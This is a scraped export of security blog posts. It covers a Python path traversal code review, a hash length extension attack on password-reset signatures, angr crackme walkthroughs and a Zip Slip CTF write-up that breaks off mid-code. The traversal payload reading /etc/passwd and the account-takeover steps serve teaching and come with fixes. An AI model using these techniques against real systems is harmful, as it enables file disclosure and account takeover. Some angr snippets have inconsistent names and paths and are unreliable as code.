loss of sensitive information like credentials, customer data etc Let us look into some vulnerable Python code and see how this issue arises. Sample Vulnerable Code # Can you spot where the issue is? class MyServer(BaseHTTPRequestHandler): def do_GET(self): cookies = SimpleCookie(self.headers.get(\u0026#39;Auth-Token\u0026#39;)) if cookies.get(\u0026#39;auth_id\u0026#39;): username=open(cookies.get(\u0026#39;auth_id\u0026#39;).value).readlines()[0] else: username=\u0026#39;guest\u0026#39; self.send_response(200) self.send_header(\u0026#34;Content-type\u0026#34;, \u0026#34;text/html\u0026#34;) self.end_headers() self.wfile.write(bytes(\u0026#34;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026#34;, \u0026#34;utf-8\u0026#34;)) self.wfile.write(bytes(\u0026#34;\u0026lt;body\u0026gt;\u0026#34;, \u0026#34;utf-8\u0026#34;)) self.wfile.write(bytes(\u0026#34;\u0026lt;h1\u0026gt;Hello %s\u0026lt;/h1\u0026gt;\u0026#34; % username, \u0026#34;utf-8\u0026#34;)) self.wfile.write(bytes(\u0026#34;\u0026lt;p\u0026gt;This is a protected area, please provide valid token to access\u0026lt;/p\u0026gt;\u0026#34;, \u0026#34;utf-8\u0026#34;)) self.wfile.write(bytes(\u0026#34;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;, \u0026#34;utf-8\u0026#34;)) Overview # Let us look at what the application does, discuss a technique for tracing user input and then identify our vulnerability. Functionality # We have one class containing a method called do_GET From the python documentation, the method works by mapping a request to a local file by interpreting the request as a path relative to the working directory This method is contained with the http.server in-built module We begin by retrieving the value of the header \u0026lsquo;Auth-Token\u0026rsquo; and creating a SimpleCookie object We then check if there is a cookie named auth_id in the request headers by using the get() method of the SimpleCookie object. When such a cookie is present, the open function opens a file with the value of the cookie as its name, reads the first line of that file, and assigns it to the username variable. When the cookie is not present, the username variable is assigned the value of guest. Source and Sink # This terminology is commonly used in data flow analysis and can be applied to the analysis of code. A source is where data comes from while a sink is where data ends. Therefore, we approach our analysis by looking for any areas of the application where a user can input data, then look at how the data is being handled. Spot any dangerous functions that handle the user input. Are there any ways of exploiting these functions? Vulnerability # Let us apply the above method in finding the issue with the code We have this line where we get the header of Auth-Token. cookies = SimpleCookie(self.headers.get(\u0026#39;Auth-Token\u0026#39;)) A user can change the value of the Auth-Token ID and supply the request to the server with their own data. But this is not helpful because that data is not processed by any dangerous function in the code.\nThe other part of the code where we receive user input is\nusername=open(cookies.get(\u0026#39;auth_id\u0026#39;).value).readlines()[0] We are getting the value of the auth_id cookie. This data can be modified by a user before sending it to the server. Being a point of input, let us look at any dangerous functions in use\nThe data is passed to the open function that opens a file and returns a file object. Because we can edit into the cookie value, it makes it possible that we can supply a file outside the web root directory in the server and a file object will be returned and we can read information from the server\nIn a nutshell, that is how such a bug can occur in an application. How can this be exploited?\nAttack principle # We modify a request being sent to the server and change the \u0026ldquo;auth_id\u0026rdquo; cookie to a value such as '../../../etc/passwd' The server processes the request by parsing that value and using the open function to load the directory. The ../ character allows the attacker to move upward the directory tree The object is accessed and returned to the body The example below shows how the attack works in real-time. Using the python3 IDLE terminal, we can use the open function to read the etc passwd directory as shown: \u0026gt;\u0026gt;\u0026gt; open(\u0026#39;../../../etc/passwd\u0026#39;).readlines()[0] \u0026#39;root: x:0:0:root:/root:/usr/bin/zsh\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; Impact # Arbitrary File read: An attacker can read files on the system with the permissions the web server is running on. This could lead to the disclosure of sensitive info Remote Code Execution: Typically, this vulnerability exists commonly in applications that allow one to upload files. An attacker could potentially upload malware to a server and use the path traversal vuln to execute the file gaining remote code execution on a server Mitigations # Input validation/ Sanitizing user input In this method, we patch the issue by sanitizing any foreign characters that may be sent as part of the cookie such as the ../ A good way to implement input validation is by combining it with different security measures In the example below, we filter the .. by ensuring those characters do not appear in the cookie: import os class MyServer(BaseHTTPRequestHandler): def do_GET(self): cookies = SimpleCookie(self.headers.get(\u0026#39;Auth-Token\u0026#39;)) if cookies.get(\u0026#39;auth_id\u0026#39;): auth_id = cookies.get(\u0026#39;auth_id\u0026#39;).value if \u0026#34;..\u0026#34; in auth_id or not auth_id.isalnum(): self.send_response(400) . . . return username=open(auth_id).readlines()[0] else: username=\u0026#39;stranger\u0026#39; self.send_response(200) . . . The problem with this implementation is the filter can be bypassed e.g using URL encoded characters like %2e%2e which represents a dot(.) and other methods Input validating for those URL-encoded characters and other potential bypasses is not enough because attackers are constantly finding new creative ways to bypass filters Whitelisting This makes it way harder to perform a path traversal because only a select number of paths are allowed. It prevents one from accessing any other files. In the example below we use an array called whitelist which contains the directories the user can access. class MyServer(BaseHTTPRequestHandler): def do_GET(self): cookies = SimpleCookie(self.headers.get(\u0026#39;Cookie\u0026#39;)) if cookies.get(\u0026#39;session_id\u0026#39;): session_id = cookies.get(\u0026#39;session_id\u0026#39;).value whitelist = [\u0026#34;/path/to/file1\u0026#34;, \u0026#34;/path/to/file2\u0026#34;, \u0026#34;/path/to/file3\u0026#34;] if session_id not in whitelist: self.send_response(404) . . . return username=open(session_id).readlines()[0] else: username=\u0026#39;stranger\u0026#39; Principle of least privilege Ensure the web server user is running with only the minimum necessary privileges. This reduces the impact of the vulnerability. Sandboxing Sandbox environments are hardened environments that create a string boundary between the running programs and the operating system. Even if an attacker were to gain access, they won\u0026rsquo;t be able to reach other areas of the system, network, OS etc Conclusion # The path traversal bug is very simple to exploit and is still occurring in modern applications. We discussed a few use cases but there\u0026rsquo;s still a tonne of possible scenarios that may lead to this bug. This has been captured in the CVE details website, with cases stemming as late as 26th January 2023 ","date":"29 January 2023","permalink":"/posts/2023-01-25_code_review_02/","section":"Posts","summary":"Introduction # In the second part of the secure code review series, we look at path traversal bugs.","title":"Secure Code Review - Path Traversal Bugs"},{"content":" Introduction # Welcome to the secure code review series, where we take a closer look at different types of code and evaluate them based on potential security vulnerabilities. In this series, we\u0026rsquo;ll be reviewing code from various programming languages, including Python, Java, and PHP. The goal is to provide valuable insights and feedback to developers and security engineers, as well as to encourage a culture of continuous improvement within the tech community. In each review, we\u0026rsquo;ll be examining sample code for potential security vulnerabilities and providing concrete suggestions for improvement. Whether you\u0026rsquo;re a seasoned developer or just starting out, I hope you\u0026rsquo;ll find this series informative and helpful. The only prerequisite for this series is being able to read some code :) Strategies # Let us discuss some of the best-practice strategies and method we can use when reviewing source code Top-to-bottom approach\nThis practice takes an approach that begins reviewing code at the highest level of abstraction . By looking at the bigger picture, one can start off by studying the overall architecture of the application, which entails looking into the various modules in an application and their functionalities, dependencies and design patterns. Gradually, you move into the specific modules’ functionalities and logic, examining implementation details, documentation, and use of libraries, APIs or dependencies. This approach provides a good overview of the application code base and functionalities, and how the different functionalities interact with each other. Bottom-to-top approach\nThis idea aims to focus on the specific implementation of the details in the code such as how data types, functions, APIs, libraries, application logic etc. This information lies at the lowest abstraction of code and the reviewer gradually works upward towards higher level of abstraction such as the architecture in use Threat-Modelling approach\nThis approach involves identifying known vulnerabilities and reviewing the code to find those vulns Risk-based approach\nThis approach involves identifying any potential risks to the system and focusing the code review process on these potential risks\nThese approaches can be used alone or in combination to get a greater understanding of the code base, from the bigger picture down to the intricate details. Automation is also a good way to speed up the process and can help to narrow it down to specific and reduce noise.\nLet us begin by focusing on the various building blocks to performing secure code review in python applications\nReviewing Code # When reviewing sample code for vulnerabilities at the implementation level, you can look for the following: Dangerous functions: Some functions introduce security issues when used incorrectly or regardless of how they are used. e.g a function like gets() in C, should never be used as it introduces buffer overflow vulnerabilities. include() or require() in PHP can be used to achieve RCE via LFI or RFI vulnerabilities, but correct usage of the functions prevents that Arguments and constants: Ensure arguments or constants passed to any potentially dangerous functions are properly validated and sanitized to prevent injection attacks Filters: Ensure input and output is properly sanitized and filtered to prevent XSS or other types of injection attacks. Error handling: properly handling errors prevents leaking of information which may pose security threats Authentication and Authorization: sensitive data and resources should be protected to prevent privilege escalation vulnerabilities or authentication bypasses that access such information. Passwords should be hashed properly, salted or encrypted. Users should also be granted minimum permissions/privileges to perform their jobs Sample Vulnerable Code # Let us look into how we can utilize the strategies and chokepoints discussed above for a simple secure code review Can you spot the vulnerability in the code below: import hashlib from flask import Flask, redirect from secrets import token_hex secret = \u0026#34;secret_key\u0026#34; app = Flask(__name__) def sign_for_reset(reset_information): # compute signature to ensure the reset details cannot be tampered with data = secret+reset_information return hashlib.sha256(data.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() @app.route(\u0026#39;/reset_password/\u0026lt;email\u0026gt;\u0026#39;) def reset_password_route(email): token = token_hex(16) reset_info = \u0026#34;token=\u0026#34;+token+\u0026#34;\u0026amp;email=\u0026#34;+email params = reset_info+\u0026#34;\u0026amp;sign=\u0026#34;+sign_for_reset(reset_info) return redirect(\u0026#34;https://trevorsaudi.com/reset_password?\u0026#34;+params, code=302) if __name__ == \u0026#34;__main__\u0026#34;: app.run() Overview # We begin by understanding what the sample code does using a top-to-bottom-approach. Dependencies # The sample code begins by importing hashlib, secrets and Flask. The hashlib library is used for hashing of files and objects, secrets module is used to generate secure tokens that are difficult to bruteforce and can be used for tokens for password resets, hard-to-guess URLs etc. Flask is used to create a flask app Functionality # We have 2 functions: sign_for_reset and reset_password We can identify one route as well in the application /reset_password. This route maps to the reset_password() function in the application. We can also see that it calls sign_for_reset and is hence a good starting point for our code review. 1. sign_for_reset()\nThe function begins by generating a random ID using token_hex, a method in the secrets module. The reset_info variable contains a concatenation of the token ID and the email we are resetting the password for The reset_info information then gets concatenated with a signature generated by the sign_for_reset function which takes the download info and a secret hardcoded in the code, computes a SHA256 hash of the concatenation and returns the hexdigest. The function redirects to https://trevorsaudi.com/reset_password? with the download information as the parameters. 2. sign_for_reset\nThis function uses the SHA256 hash function to sign the download information, which involves concatenating a secret with the password reset information and then computing the SHA256 hash of the concatenated string Dangerous functions # In the \u0026lsquo;Reviewing Code\u0026rsquo; section, we talked about various building blocks and places to focus on in code review. Let us single out the usage of dangerous functions. We mentioned that some functions are not inherently vulnerable, but could introduce security issues when used incorrectly. The sign_for_reset function computes the SHA256 hash of the concatenation of the secret and download information. Cryptographic hash functions like MD5,SHA1, SHA256, SHA512 are vulnerable to several attacks. In this implementation, we are looking at a length extension attack that allows us to tamper with the download data information and still be able to sign it as valid. Let us look into the vulnerability in depth: Hash-Length Extension attack # This attack abuses poorly constructed authentication schemes A hash function takes input, performs calculations on it, and produces a fixed-length output called a digest. If the input is large, it is split into smaller blocks and processed one at a time, such as the CBC (Cipher Block Chaining), where a hash is generated for a block, then for the next block, add the previous hash to the block and hash it The function also adds predictable padding to the input before processing it. The padding does not add any security to the overall process. It will vary based on the length of secret+data, introducing a requirement where the length of the secret is needed to be able to append more data Conditions to be met in an attack : # We should know the length of the key We can control the content of the message We already know the hash value of a message containing a key Attack principle # In summary, this is how the attack works: An attacker intercepts a password reset link that is sent to a user\u0026rsquo;s email. The link contains a token and a hash of the token and email address.\nThe attacker knows that the hash function being used is vulnerable to hash length extension attacks, such as the one in the code provided.\nThe attacker can use a tool such as hashpump to generate a new hash that has the same prefix as the original hash, but with additional data appended to it. The additional data is a command to change the email address associated with the account to the attacker\u0026rsquo;s email address.\nThe attacker can then use the modified password reset link to reset the password for the account, effectively taking over the account.\nIn case we do not know the length of the secret, we can bruteforce the padding length to find a hash similar to the one generated by the program Remediation # Cryptographic Signing Schemes # A more secure alternative to using a simple hash function is to implement a cryptographic signing scheme, such as HMAC or a digital signature scheme like RSA or ECDSA. These methods use a key to sign and verify the data, making it more difficult for an attacker to alter it.\nBelow is an example of the secure implementation to remediate the vulnerability. hmac module is used to create a message authentication code (MAC) of the reset information. The MAC uses a secret key to sign the data. An attacker can\u0026rsquo;t generate a valid MAC without knowing the secret key\nimport hmac secret = \u0026#34;secret_key\u0026#34; app = Flask(__name__) def sign_for_reset(reset_information): # compute signature to ensure the reset details cannot be tampered with data = reset_information return hmac.new(secret.encode(\u0026#39;utf-8\u0026#39;), msg=data.encode(\u0026#39;utf-8\u0026#39;), digestmod=hashlib.sha256).hexdigest() @app.route(\u0026#39;/reset_password/\u0026lt;email\u0026gt;\u0026#39;) def reset_password_route(email): token = token_hex(16) reset_info = \u0026#34;token=\u0026#34;+token+\u0026#34;\u0026amp;email=\u0026#34;+email params = reset_info+\u0026#34;\u0026amp;sign=\u0026#34;+sign_for_reset(reset_info) return redirect(\u0026#34;https://trevorsaudi.com/reset_password?\u0026#34;+params, code=302) if __name__ == \u0026#34;__main__\u0026#34;: app.run() Hmac module is used to create a message authentication code (MAC) of the reset information. The MAC uses a secret key to sign the data. An attacker can\u0026rsquo;t generate a valid MAC without knowing the secret key, hence mitigating the vulnerability ","date":"10 January 2023","permalink":"/posts/2023-01-11_code_review_01/","section":"Posts","summary":"Introduction # Welcome to the secure code review series, where we take a closer look at different types of code and evaluate them based on potential security vulnerabilities.","title":"Secure Code Review - Hash Length Extension Attack"},{"content":" Overcoming path explosion, injecting bitvectors into symbolic registers using angr\nIntroduction # In the previous blog, we looked into what Symbolic Execution is and how we can utilize the Angr framework in finding execution paths to reach desirable states in programs. In this blog, we will look at the limitations that Symbolic Execution imposes and how we can use Angr to efficiently navigate through these limitations. We shall also introduce symbolic registers and how to inject symbols directly into registers.\nPath Explosion # In our previous example, we had a simple program with only 2 possible execution paths, one printing out \u0026ldquo;good job\u0026rdquo; while the other \u0026ldquo;try again\u0026rdquo;.\nIn a more practical case with a complex program with very many states, execution paths grow exponentially. In the case of unbounded loops in the program, we could even have infinite execution paths making it unfeasible to analyze all these paths. This is the problem of path explosion\nLet us see how we can overcome path explosion in the second binary example using Angr\n02_angr_find_condition # This is the 3rd binary file in the exercise\n➜ 02_angr_find_condition git:(master) ✗ ls 02_angr_find_condition.c.jinja generate.py __init__.py scaffold02.py ➜ 02_angr_find_condition git:(master) ✗ Run the binary to see its functionality.\n➜ dist git:(master) ✗ ./02_angr_find_condition Enter the password: asdasd Try again. It is similar to the previous binary that we looked at. Let us disassemble the main function of the binary in Cutter to get more information.\nWell, it\u0026rsquo;s a bloody mess.\nThere are tonnes of branches leading to several \u0026lsquo;Try again\u0026rsquo; and \u0026lsquo;Good job\u0026rsquo; states.\nIt would be tedious noting down the addresses of all Good job states. Instead, we can tell Angr to avoid or consider a state based on the output that the state gives.\nThere is a scaffold.py file in each binary file\u0026rsquo;s directory that contains skeleton code that will guide you in your solution. We will slightly modify the skeleton code to come up with our solution.\nSolution # Import necessary libraries \u0026amp; set up an Angr project. import angr import sys def main(): path_to_binary = \u0026#39;/opt/angr_ctf/dist/02_angr_find_condition\u0026#39; project = angr.Project(path_to_binary) print(\u0026#34;[+] Loaded the binary to angr\u0026#34;) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) Building out the logic def successful(state): #1 stdout_output = state.posix.dumps(sys.stdout.fileno()) #2 if b\u0026#39;Good Job.\u0026#39; in stdout_output: #3 return True def abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Try again.\u0026#39; in stdout_output: return False The 2 functions defined - successful and abort, carry out our program\u0026rsquo;s logic. They simply check if you have found the state that you are looking for.\nWe begin by defining our function which is going to take in a state#1. We then take what is printed to stdout and assign it to the stdout_output variable #2. The output of state.posix.dumps is a python bytes object, so we use b\u0026rsquo; \u0026lsquo; to capture the string \u0026lsquo;Good job\u0026rsquo; from the stdout_output variable and return True if found #3.\nWe do the same for the abort function where we check for the \u0026lsquo;Try again\u0026rsquo; string.\nExploring code paths simulation.explore(find=successful, avoid=abort) We can then tell Angr what states to explore and what to avoid exploring. simulation.explore has 2 arguments, find and avoid. They take in an address or a list of addresses. Our program is going to start exploring based on those functions that accept a state and return whether it matches or not\nHouse-keeping if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) print(\u0026#34;[+] Solution found! : {}\u0026#34;.format(solution.decode(\u0026#39;utf-8\u0026#39;))) else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() We finish up by printing the solution once the simulation manager finds the desired state.\nOur final script:\nimport angr import sys def main(): path_to_binary = \u0026#39;/opt/angr_ctf/dist/02_angr_find_condition\u0026#39; project = angr.Project(path_to_binary) print(\u0026#34;[+] Loaded the binary to angr\u0026#34;) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) # define a function that checks if you have found the state you are looking for def successful(state): # dump what the binary has printed out into a string stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Good Job.\u0026#39; in stdout_output: return True def abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Try again.\u0026#39; in stdout_output: return False simulation.explore(find=successful, avoid=abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) print(\u0026#34;[+] Success! Solution is: {}\u0026#34;.format(solution.decode(\u0026#39;utf-8\u0026#39;))) else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Run the code:\nWe get our solution :)\n03_angr_symbolic_registers # Let\u0026rsquo;s crank up the difficulty and see more Angr functionality! We proceed to disassemble our binary.\nVarious functions are of interest. We can begin by inspecting the main() function. Cutter gives us a nice decompiled output that can help us understand better what our program does under the hood.\nProgram analysis # First, we can let us get a general overview of what happens in the main function to understand the functionality of the program\nThere are 3 variables that get initialized in the main function. Technically 4, but we ignore int32_t var_4h as it is used for other procedures out of scope in this tutorial.\nImmediately after initializing, there is a call to get_user_input() function which we will have a look at shortly. Our input is stored in the 3 variables which are placed in registers eax, ebx, edx and the complex_function functions are used to perform some operations on these variables.\nLet us have a look at the get_user_input() function\nIn the scanf function, we can see these 3 badboys - \u0026ldquo;%x %x %x\u0026rdquo;, which means that we are taking 3 inputs as hexadecimal numbers. These are the values moved to the registers we noted earlier.\nSo how are we going to approach our exploit? Let us walk through step by step\nImport necessary libraries \u0026amp; set up an Angr project import angr import sys import claripy def main(): path_to_binary = \u0026#39;/opt/angr_ctf/dist/02_angr_find_condition\u0026#39; project = angr.Project(path_to_binary) print(\u0026#34;[+] Loaded the binary to angr\u0026#34;) We have an additional library claripy different from before. We will see its usage later.\nInitialize the starting address. In the previous examples, we had Angr start at the beginning of the program. But due to Angr\u0026rsquo;s functionality, format strings are not handled well and we need to skip the call to scanf that specified the %x format strings to pick our hex input.\nRight after the get_user_input(), we pick the address of the next instruction\nwhich is 0x08048980\nstart_address = 0x08048980 initial_state = project.factory.blank_state(addr=start_address) Note that we used blank_state() instead of entry_state(). This effectively creates a new address that will be the starting point for Angr\nSymbol injection into registers. Remember the 3 registers that we noted earlier (eax, ebx, edx)? We are going to replace the value inside the register (which we don\u0026rsquo;t know) with our symbol, by injecting into it. Before doing so, let us look at a key concept: Bitvectors - simply put, it is an array of bits.\nOur registers are 32 bits in length, so our variables are going to be just as much long, represented as bitvectors.\nThis will look as follows:\nsize = 32 pass1 = claripy.BVS(\u0026#39;pass1\u0026#39;, size) pass2 = claripy.BVS(\u0026#39;pass2\u0026#39;, size) pass3 = claripy.BVS(\u0026#39;pass3\u0026#39;, size) Note that we now make use of the claripy library to create our bitvectors which uses the BVS method(bitvector symbol).\nLet us now take our symbols and inject them into the registers. We are going to set the registers based on the starting address initial_state, which essentially marks the registers.\ninitial_state.regs.eax = pass1 initial_state.regs.ebx = pass2 initial_state.regs.edx = pass3 simulation = project.factory.simgr(initial_state) House-keeping Our routine functions for finding the states we need and should avoid.\ndef successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Good Job.\u0026#39; in stdout_output: return True; def abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Try again.\u0026#39; in stdout_output: return True simulation.explore(find=is_successful, avoid=should_abort) Prepare the output There is a possibility of getting multiple solutions. solution_state.solver.eval ensures that we pick one solution for each symbol and also, formats it into a hexadecimal value\nif simulation.found: solution_state = simulation.found[0] pass1 = format(solution_state.solver.eval(pass1), \u0026#39;x\u0026#39;) pass2 = format(solution_state.solver.eval(pass2), \u0026#39;x\u0026#39;) pass3 = format(solution_state.solver.eval(pass3), \u0026#39;x\u0026#39;) solution = pass1 + \u0026#34; \u0026#34; + pass2 + \u0026#34; \u0026#34; + pass3 + \u0026#34; \u0026#34; print(\u0026#34;[+] Success! Solution is: {}\u0026#34;.format(solution)) else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Solution # Our final script\nimport angr import sys import claripy def main(): path_to_binary = \u0026#39;/home/saudi/Desktop/CTF/angrchalls/angr_ctf/dist/03_angr_symbolic_registers\u0026#39; project = angr.Project(path_to_binary) print(\u0026#34;[+] Loaded the binary to angr\u0026#34;) base_address = 0x8048980 initial_state = project.factory.blank_state(addr=base_address) size = 32 pass1 = claripy.BVS(\u0026#39;pass1\u0026#39;, size) pass2 = claripy.BVS(\u0026#39;pass2\u0026#39;, size) pass3 = claripy.BVS(\u0026#39;pass3\u0026#39;, size) initial_state.regs.eax = pass1 initial_state.regs.ebx = pass2 initial_state.regs.edx = pass3 simulation = project.factory.simgr(initial_state) def successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Good Job.\u0026#39; in stdout_output: return True; def abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b\u0026#39;Try again.\u0026#39; in stdout_output: return True simulation.explore(find=successful, avoid=abort) if simulation.found: solution_state = simulation.found[0] pass1 = format(solution_state.solver.eval(pass1), \u0026#39;x\u0026#39;) pass2 = format(solution_state.solver.eval(pass2), \u0026#39;x\u0026#39;) pass3 = format(solution_state.solver.eval(pass3), \u0026#39;x\u0026#39;) solution = pass1 + \u0026#34; \u0026#34; + pass2 + \u0026#34; \u0026#34; + pass3 + \u0026#34; \u0026#34; print(\u0026#34;[+] Success! Solution is: {}\u0026#34;.format(solution)) else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Our solution :)\nWe come to the end of the tutorial having covered some more advanced concepts. See you in the next where I take you through hell :)\n","date":"18 August 2022","permalink":"/posts/symbolic_execution_angr_part2/","section":"Posts","summary":"Overcoming path explosion, injecting bitvectors into symbolic registers using angr","title":"Symbolic Execution with Angr - part 2"},{"content":" An overview of the binary analysis python framework angr in performing symbolic execution.\nSymbolic Execution # Before introducing the angr python framework, it is important to understand the key concept that lies at the heart of angr\u0026rsquo;s core functionality - symbolic execution.\nSymbolic execution is a technique of program analysis where instead of supplying normal inputs to a program during testing, symbolic inputs that represent arbitrary values are supplied.\nThink of symbolic inputs as variables such as those in algebra. Since we are trying to find a variable that will trigger a given state, symbolic execution will walk through all possible paths to reach that desired state, solving for that particular variable.\nSuppose we have an equation as follows: \\(x^2 + 6x + 18 = 12\\)\nx represents our symbol and it depends on a given execution path that binds it.\nAn execution path is how you traverse through the program to reach a state.\nExample 1 # Given a simple program, let us map out the execution paths of the program\ninput = input(\u0026#39;Input the password: \u0026#39;) if input == \u0026#39;goodpass\u0026#39;: print \u0026#39;Success.\u0026#39; else: print \u0026#39;Try again.\u0026#39; path 1: User enters \u0026lsquo;goodpass\u0026rsquo; as input\ngraph TB; A[input = λ ]--\u003eB[if input == 'goodpass']; B--\u003eC[print 'Success'] path 2: User enters \u0026lsquo;pass123\u0026rsquo; as input\ngraph TB; A[input = λ ]--\u003eB[if input == 'pass123']; B--\u003eC[print 'Try Again'] λ is the symbol that represents our input variable To find the value of λ, we can walk back in a given execution path to find out what input triggers a given branch. In the first branch, backtracking leads you to (if input == \u0026lsquo;goodpass\u0026rsquo;), where goodpass triggers the desirable input.\nLet us look into how we can do this using the angr framework\nThe Angr Framework # Angr is a binary analysis framework based on a suite of python 3 libraries that allows you to carry out various tasks.\nWith its symbolic execution engine, it can step into a binary\u0026rsquo;s various states and follow any branch leading to the states, find a state that matches given criteria and solves for a symbolic variable depending on a given execution path as we demonstrated in the Introduction.\nInstallation instructions can be found here\nClone this repository which contains the files we will need throughout this n-part series.\nIn the dist directory, you will find all your project files.\n➜ dist git:(master) pwd /opt/angr_ctf/dist ➜ dist git:(master) ls 00_angr_find 07_angr_symbolic_file 14_angr_shared_library scaffold02.py scaffold09.py scaffold16.py 01_angr_avoid 08_angr_constraints 15_angr_arbitrary_read scaffold03.py scaffold10.py scaffold17.py 02_angr_find_condition 09_angr_hooks 16_angr_arbitrary_write scaffold04.py scaffold11.py 03_angr_symbolic_registers 10_angr_simprocedures 17_angr_arbitrary_jump scaffold05.py scaffold12.py 04_angr_symbolic_stack 11_angr_sim_scanf lib14_angr_shared_library.so scaffold06.py scaffold13.py 05_angr_symbolic_memory 12_angr_veritesting scaffold00.py scaffold07.py scaffold14.py 06_angr_symbolic_dynamic_memory 13_angr_static_binary scaffold01.py scaffold08.py scaffold15.py ➜ dist git:(master) 00_angr_find # The first example we look into sets us up for basic angr usage. Run the binary in your terminal to see how it works\n➜ dist git:(master) ./00_angr_find Enter the password: pass123 Try again. Program analysis # It is a simple program that asks for a password. We can disassemble the program to find out more information. Using a disassembler of your choice, disassemble the main function and view your control graph.You can use ghidra, IDA pro, Cutter, radare etc. I disassembled with Cutter\nThe control graph is not too complicated but we don\u0026rsquo;t have to spend time analyzing it to find the password\n2 branches are of interest.\nBranch 1 triggered \u0026ldquo;Try again\u0026rdquo; while branch 2 should trigger \u0026ldquo;Good job\u0026rdquo;\nOur goal is to trigger branch 2 by supplying the correct password.\nSolution # Let us build out our solution in python step by step.\nImport necessary libraries. import angr import sys sys library will be used to parse our arguments\nInstantiate an angr project. def main(): path_to_binary = \u0026#39;/opt/angr_ctf/dist/00_angr_find\u0026#39; project = angr.Project(path_to_binary) #1 initial_state = project.factory.entry_state() #2 simulation = project.factory.simgr(initial_state) #3 We provide the path to the project and use the Project method to create an instance of an angr project to work with. #1 We then create an initial_state variable that holds the entry point to the program. This is necessary for the symbolic execution engine to know where to start exploring the program.#2\nWe follow through with a simulation manager object that starts executing at the entry point of our program. #3\nAddresses definition print_good_address = 0x8048675 #4 simulation.explore(find=print_good_address) #5 The good address that we want is the one of the branches that leads to printing \u0026lsquo;Good job\u0026rsquo; indicated below as 0x8048675\nHouse-keeping if simulation.found: #6 solution_state = simulation.found[0] #7 solution = solution_state.posix.dumps(sys.stdin.fileno()) #8 print(\u0026#34;[+] Solution found! : {}\u0026#34;.format(solution.decode(\u0026#39;utf-8\u0026#39;))) #9 else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) #10 if __name__ == \u0026#34;__main__\u0026#34;: main() Once the execution paths to reach our desirable address have been obtained, we begin by checking if our simulation variable contains something. #6.\nIf we found something, we obtain the input that triggered that particular state. #7\nWe then dump it #8 and print it out #9\nIf not, we raise an exception #10\nOur final script looks as follows:\nimport angr import sys def main(): path_to_binary = \u0026#39;/opt/angr_ctf/dist/00_angr_find\u0026#39; project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) print_good_address = 0x8048675 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) print(\u0026#34;[+] Success! Solution is: {}\u0026#34;.format(solution.decode(\u0026#39;utf-8\u0026#39;))) else: raise Exception(\u0026#34;Could not find the solution\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Run it to see angr perform its dark magic\nWe easily find the string that triggers our desirable state.\nFor the next binary 01_angr_avoid, the solution is exactly the same as this only that you shall have to specify the address of the branch you want to avoid.\nIn the next tutorial, we will look at more advanced concepts such as how to avoid path explosion and also injecting symbolic values into registers. Stay tuned!\n","date":"15 August 2022","permalink":"/posts/symbolic_execution_angr_part1/","section":"Posts","summary":"An overview of the binary analysis python framework angr in performing symbolic execution.","title":"Symbolic Execution with Angr - part 1"},{"content":" An overview of the zip slip vulnerability in a python application.\nOverview # Zip Slip is a widespread arbitrary file overwrite vulnerability that typically results in remote code execution. Discovered in June 5th 2018 by the Snyk Research team, it affects thousands of projects.\nThe vulnerablity affects ecosystems that have no central library offering high level processing of archive files. Several web applications allow users to submit files in compressed format to reduce the size of files being uploaded. Later on, the compressed files get decompressed to retrieve to actual files. Zip Slip aims to target such applications\nIn a previously concluded CTF - JustCTF 2022, one of the web challenges features a web application vulnerable to the Zip Slip vulnerability. We will look at how the exploit to achieve an arbitrary file read on the server works.\nLocal Testing # The challenge consists of a REST API endpoint that receives a zip file via HTTP POST and returns a JSON object containing the contents of every file in the zip.\nWe are also provided with the back-end code for the REST API linked here that you can run and host the application locally using docker.\nLet us upload a zip file and see how the application interacts with it.\nCreate the zip file\nUpload the zip file to the application using curl\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://localhost/extract\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: multipart/form-data\u0026#39; \\ -F \u0026#39;file=@test.zip;type=application/zip\u0026#39; {\u0026#34;test.txt\u0026#34;:\u0026#34;hello\\n\u0026#34;}% The server\u0026rsquo;s response is captured below:\nCode Review # In summary, our application is using 2 key libraries: zipfile and patoolib to validate the uploaded archive and to decompress the archive to retrieve the contents.\nIn server.py, we begin by importing our key libraries:\nfrom zipfile import is_ zipfile . . . from patoolib import extract_archive This block of code is where the magic happens. is_zipfile is used to validate whether the uploaded file is a zip file, and throws an error if it isn\u0026rsquo;t.\nextract_archive is used to extract the contents of the zip file and stores the contents in a directory\nif not is_zipfile(file_to_extract): raise HTTPException(status_code=415, detail=f\u0026#34;The input file must be an ZIP archive.\u0026#34;) with TemporaryDirectory(dir=tmpdir) as extract_to_dir: try: extract_archive(str(file_to_extract), outdir=extract_to_dir) except PatoolError as e: raise 